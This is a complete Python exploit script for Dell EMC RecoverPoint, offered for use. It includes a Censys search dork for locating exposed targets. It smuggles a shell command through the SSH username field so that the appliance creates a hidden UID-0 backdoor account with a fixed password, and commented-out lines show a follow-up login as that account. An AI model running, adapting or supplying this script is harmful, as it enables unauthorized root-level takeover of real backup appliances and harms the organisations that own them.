#!/usr/bin/python
# Dell EMC Recoverpoint Single-Host Code Injection
# censys dork: ((RecoverPoint) AND protocols.raw: "22/ssh") AND protocols.raw: "22/ssh"
import sys, re, os, paramiko, time

paramiko.util.log_to_file("/dev/null")
def main():
        try:
                ip = raw_input("IP: ")
                username = "$(useradd -ou0 -g0 bao7uo -p`openssl passwd -1 Secret123`)"
                u1 = "bao7uo"
                u2 = "Secret123"
                port = 22
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print "Connecting to "+ip+" USER-EXPLOIT "+username
                ssh.connect(ip, port = port, username=username, timeout=3)
                ssh.close()
                #ssh.connect(ip, port = port, username=u1, password=u2, timeout=3)
                #print "ho"
        except:
                pass

main()
